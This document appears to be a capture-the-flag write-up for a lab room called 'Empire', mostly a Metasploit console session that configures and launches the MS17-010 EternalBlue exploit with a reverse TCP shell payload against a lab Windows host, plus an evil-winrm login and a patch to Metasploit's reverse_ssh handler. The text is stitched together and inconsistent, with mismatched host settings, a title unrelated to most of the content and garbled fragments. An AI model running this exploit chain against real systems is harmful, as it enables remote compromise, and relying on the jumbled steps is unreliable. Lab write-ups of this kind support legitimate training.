# Empire — Writeup

## Overview
### Empire — Writeup
### Empire — Writeup
```text
Installing the current project: empire-bc-security-fork (4.6.1)
[+] Install Complete!

[+] Run the following commands in separate terminals to start Empire
[*] ./ps-empire server
[*] ./ps-empire client
[*] source ~/.bashrc to enable nim
```
```text
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.239.254 -u Sam
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                   

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                     

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Sam\Documents> 

To create an Empire listener, run the following:

solving msfconsole

nano  /usr/share/metasploit-framework/lib/msf/core/handler/reverse_ssh.rb

+      rescue OpenSSL::PKey::PKeyError => e
+        print_error("ReverseSSH handler did not load with OpenSSL version #{OpenSSL::VERSION}")
+        elog(e)
+        'SSH-2.0-OpenSSH_5.3p1'

en vez de esto:
       rescue LoadError => e
        print_error("This handler requires PTY access not available on all platforms.")
         elog(e)
         'SSH-2.0-OpenSSH_5.3p1'
        
***hacking blue and get reverse shell***
┌──(root㉿kali)-[/home/kali]
└─# msfconsole                      
                                                  

      .:okOOOkdc'           'cdkOOOko:.                                              
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                            
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                           
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                          
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo                                          
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx                                          
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl                                          
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.                                          
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc                                           
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo                                            
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl                                             
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;                                              
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.                                               
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,                                                 
           :kk;.OOOOOOOOOOOOO.;Ok:                                                   
             ;kOOOOOOOOOOOOOOOk:                                                     
               ,xOOOOOOOOOOOx,                                                       
                 .lOOOOOOOl.                                                         
                    ,dOd,                                                            
                      .                                                              

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command
```
```text
msf6 > 

──(kali㉿kali)-[~]
└─$ msfconsole -q
```
```text
msf6 > search ms17

Matching Modules
================
```
```text
#  Name                                                  Disclosure Date  Rank     Check  Description
   -  ----                                                  ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue                     average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec                          normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command                         normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/fileformat/office_ms17_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   5  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS
   6  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   7  exploit/windows/smb/smb_doublepulsar_rce                     great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/smb_doublepulsar_rce
```
```text
msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.18.1.77       yes       The target host(s), see https://github
                                             .com/rapid7/metasploit-framework/wiki/
                                             Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use f
                                             or authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specif
                                             ied username
   SMBUser                         no        (Optional) The username to authenticat
                                             e as
   VERIFY_ARCH    true             yes       Check if remote architecture matches e
                                             xploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
                                             get. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                        process, none)
   LHOST     192.168.13.129   yes       The listen address (an interface may be spe
                                        cified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload /windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.18.1.77       yes       The target host(s), see https://github
                                             .com/rapid7/metasploit-framework/wiki/
                                             Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use f
                                             or authentication. Only affects Window
                                             s Server 2008 R2, Windows 7, Windows E
                                             mbedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specif
                                             ied username
   SMBUser                         no        (Optional) The username to authenticat
                                             e as
   VERIFY_ARCH    true             yes       Check if remote architecture matches e
                                             xploit Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows Embed
                                             ded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Tar
                                             get. Only affects Windows Server 2008
                                             R2, Windows 7, Windows Embedded Standa
                                             rd 7 target machines.

Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread,
                                        process, none)
   LHOST     192.168.13.129   yes       The listen address (an interface may be spe
                                        cified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.149.206
rhosts => 10.10.149.206
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.18.1.77
lhost => 10.18.1.77
```
```text
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.18.1.77:4444 
[*] 10.10.149.206:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.149.206:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.149.206:445     - Scanned 1 of 1 hosts (100% complete)
